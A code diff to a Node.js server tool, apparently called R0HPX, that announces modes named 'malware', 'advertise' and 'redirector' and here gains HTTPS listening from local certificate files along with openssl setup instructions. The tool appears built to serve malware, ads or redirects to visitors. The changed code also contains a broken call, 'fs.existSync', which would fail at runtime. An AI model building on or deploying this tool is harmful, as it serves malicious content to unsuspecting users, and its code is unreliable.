@@ -4,6 +4,8 @@ var logger = require("./logger");
 var http = require('http');
 var https = require('https');
 
+var fs = require('fs');
+
 var option = '';
 var server = null;
 var sslserver = null;
@@ -13,11 +15,12 @@ var advertise = require('./sockets/advertise').handle;
 var redman = require('./sockets/redirection');
 var redirection = require('./sockets/redirection').handle;
 
-logger.log("R0HPX version %s", "2.0");
-logger.log("please choose what mode the program has to run under:");
-logger.log("- mode malware");
-logger.log("- mode advertise");
-logger.log("- mode redirector");
+function isSSL() {
+	if(fs.existsSync('cert/server.key') && fs.existsSync('cert/server.crt') && fs.existSync('cert/server.csr')) {
+		return true;
+	}
+	return false;
+}
 
 function reset() {
 	if(server !== null) {
@@ -33,13 +36,27 @@ function reset() {
 function setServer(a, o) {
 	option = o;
 	server = http.createServer(a);
-	sslserver = https.createServer(a);
 	server.listen(80, function() {
 		logger.log("setting static place holder for "+o+", started webserver at port %s!", 80);
 	});
-	sslserver.listen(443, function() {
-		logger.log("setting static place holder for "+o+", started webserver at port %s!", 443);
-	});
+	if(isSSL()) {
+		var keys = {
+			key : fs.readFileSync('cert/server.key'),
+			cert : fs.readFileSync('cert/server.crt')
+		};
+		sslserver = https.createServer(keys, a);
+		sslserver.listen(443, function() {
+			logger.log("setting static place holder for "+o+", started webserver at port %s!", 443);
+		});	
+	} else {
+		logger.log("cannot start ssl webserver, in order to let the server work please follow the following instructions:");
+		logger.log("**NOTE**");
+		logger.log("all files belong into the /cert/ folder!");
+		logger.log("(1 create private RSA key: openssl genrsa -des3 -out server.key 2048");
+		logger.log("(2 remove password phrase from key because webservers are ment to be public: openssl rsa -in server.key -out server.key");
+		logger.log("(3 create self signing certificate: openssl req -new -key server.key -out server.csr");
+		logger.log("(4 sign the certificate: openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt");
+	}
 }
 
 commandexec.addListener("data", function(d) {
@@ -97,3 +114,9 @@ commandexec.addListener("data", function(d) {
 		logger.log("command length is to long!: "+args.toString().replace(",", " "));
 	}
 });
+
+logger.log("R0HPX version %s", "2.1");
+logger.log("please choose what mode the program has to run under:");
+logger.log("- mode malware");
+logger.log("- mode advertise");
+logger.log("- mode redirector");
